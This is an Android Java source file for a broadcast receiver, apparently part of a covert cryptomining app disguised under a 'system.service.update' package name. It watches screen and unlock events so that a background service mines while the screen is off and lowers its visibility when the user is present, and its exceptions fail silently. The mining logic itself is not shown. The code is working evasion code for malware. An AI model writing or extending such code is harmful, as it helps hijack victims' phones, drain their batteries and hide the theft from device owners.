// ScreenReceiver.java
package com.system.service.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class ScreenReceiver extends BroadcastReceiver {
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        if (action == null) {
            return;
        }
        
        switch (action) {
            case Intent.ACTION_SCREEN_OFF:
                onScreenOff(context);
                break;
            case Intent.ACTION_SCREEN_ON:
                onScreenOn(context);
                break;
            case Intent.ACTION_USER_PRESENT:
                onUserPresent(context);
                break;
        }
    }
    
    private void onScreenOff(Context context) {
        // Screen turned off - optimal mining window
        notifyService(context, "screen_off");
    }
    
    private void onScreenOn(Context context) {
        // Screen turned on - reduce visibility
        notifyService(context, "screen_on");
    }
    
    private void onUserPresent(Context context) {
        // User actively using device
        notifyService(context, "user_present");
    }
    
    private void notifyService(Context context, String action) {
        try {
            Intent serviceIntent = new Intent(context, SystemService.class);
            serviceIntent.setAction(action);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
}
